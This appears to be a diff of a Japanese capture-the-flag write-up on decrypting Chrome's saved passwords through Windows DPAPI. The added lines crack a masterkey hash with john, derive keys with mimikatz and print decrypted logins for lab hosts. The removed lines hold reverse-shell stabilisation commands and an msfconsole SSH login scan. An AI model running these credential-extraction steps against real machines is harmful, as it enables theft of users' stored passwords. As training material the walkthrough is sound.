@@ -121,78 +121,59 @@ https://worksite.thm/			chrome				https://worksite.thm/	13316047349254727	0	0	3	
 
 まず、DPAPI が TPM を使うのはオプションであり、TPMが使われずに暗号化されたものは、別のPCでも復号できる可能性がある。その点を誤解していた。
 
-```sh
-cat AppData/Local/Google/Chrome/User\ Data/Local\ State | jq .os_crypt.encrypted_key -r
-```
+ハッシュからWindowsログインパスワードを得る。
 
 ```sh
-mimikatz # dpapi::chrome /in:"AppData/Local/Google/Chrome/User Data/Default/Login Data" /masterkey:ca43[REDACTED]9840 /encryptedKey:RFBBUEkBAAAA.........
+$ DPAPImk2john -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 -c local -S S-1-5-21-3854677062-280096443-3674533662-1001 > mkhash
+
+$ john mkhash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
+Windowsパスワードを使ってDPAPIのマスターキーを得る。  
+（Wine環境ではエラーになり、Windows環境で実行する必要があった）
 
+```sh
+mimikatz # dpapi::masterkey /in:"AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580" /sid:S-1-5-21-3854677062-280096443-3674533662-1001 /password:[PASSWORD]
 
+...
+
+[masterkey] with password: bubbles (normal user)
+  key : ca4387eb[REDACTED]
+  sha1: 217522c457cfe8a95da45da81d6b898080e2067d
+```
+
+`Local State` ファイルからChromeの暗号化キーを抽出する。
+
+```sh
+$ cat AppData/Local/Google/Chrome/User\ Data/Local\ State | jq .os_crypt.encrypted_key -r
+RFBBUEkBAAAA0Iyd3wEV0[REDACTED]
+```
+
+DPAPIのマスターキーとChromeの暗号化キーを使ってChromeの機密情報を復号する。
+
+```sh
+mimikatz # dpapi::chrome /in:"AppData/Local/Google/Chrome/User Data/Default/Login Data" /masterkey:ca4387eb0a[REDACTED] /encryptedKey:RFBBUEkBAAAA0[REDACTED]
+> Encrypted Key seems to be protected by DPAPI
+ * volatile cache: GUID:{8c6b6187-8eaa-48bd-be16-98212a441580};KeyHash:217522c457cfe8a95da45da81d6b898080e2067d;Key:available
+ * masterkey     : ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840
+> AES Key is: 9a3094f1bfe3e19d5d039fb569d35d49ad083ac34dbcd5d9e42a506b8d4a192c
+
+URL     : https://mysecuresite.thm/ ( https://mysecuresite.thm/ )
+Username: Administrator
+ * using BCrypt with AES-256-GCM
+Password: [REDACTED]
+
+URL     : https://worksite.thm/ ( https://worksite.thm/ )
+Username: chrome
+ * using BCrypt with AES-256-GCM
+Password: [REDACTED]
+```
 
 ## 振り返り
 
--
--
+- Chrome の暗号化方式と、WindowsのDPAPIについてなんの知識もなかったので非常に勉強になった。
+- DPAPI に関して、[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) というツールがある（というメモ）
 
 ## Tags
 
-#tags: #tags: #tags:
-
-```sh
-# 大分類（Linuxはタグ付けしない）
-Window Kerberos AWS pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM
-
-# 脆弱性の種類
-CVE-xxxx-yyyyy カーネルエクスプロイト
-ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報 証明書テンプレート
-
-# 攻撃の種類
-サービス LFI SSRF XSS SQLインジェクション 競合 認証バイパス フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス PaddingOracles フィッシング
-
-# ツールなど
-docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle スマートコントラクト
-```
-
-## メモ
-
-### シェル安定化
-
-```shell
-# python が無くても、python3 でいける場合もある
-python -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# sh: 3: export: -c: bad variable name というエラーが出る場合、まず /bin/bash を実行する。
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-```
-
-### SSH
-
-ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする
-
-```sh
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
-```
-
-エラー
-
-```sh
-# no matching host key type found. Their offer: ssh-rsa,ssh-dss
-# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
--oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
-```
+#tags:Windows #tags:DPAPI #tags:Chrome
